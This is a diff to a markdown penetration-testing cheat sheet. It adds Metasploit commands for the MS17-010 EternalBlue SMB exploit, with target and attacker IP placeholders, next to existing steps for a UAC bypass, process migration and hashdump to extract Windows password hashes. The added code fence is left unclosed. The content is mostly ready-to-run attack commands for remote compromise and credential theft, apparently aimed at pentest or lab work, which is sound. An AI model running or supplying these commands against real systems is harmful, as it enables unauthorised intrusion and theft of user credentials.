@@ -209,9 +209,14 @@ run post/windows/gather/win_privs
 exploit/windows/local/bypassuac
 set session
 ```
+** MS17-010 EternalBlue SMB Remote**
+```sh
+exploit(windows/smb/ms17_010_psexec)> set RHOST </Target-IP\>
+exploit(windows/smb/ms17_010_psexec)> set LHOST </Attacker-IP\>
+exploit(windows/smb/ms17_010_psexec)> run 
 **After PrivEsc**
 ```sh
-migrate \<pid\>
+migrate \<pid\>   
 hashdump          #to extract Users & Password's hash
 ``` 
 ## Windows Command Line
